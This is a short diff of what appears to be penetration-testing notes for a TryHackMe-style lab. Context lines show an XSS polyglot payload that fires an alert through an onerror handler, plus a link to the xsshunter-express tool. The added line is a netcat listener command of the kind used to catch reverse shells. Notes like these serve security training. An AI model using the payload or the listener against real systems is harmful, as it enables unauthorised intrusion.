@@ -137,3 +137,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stY
 
 
 https://github.com/mandatoryprogrammer/xsshunter-express
+
+nc -nlvp 9001
+
+
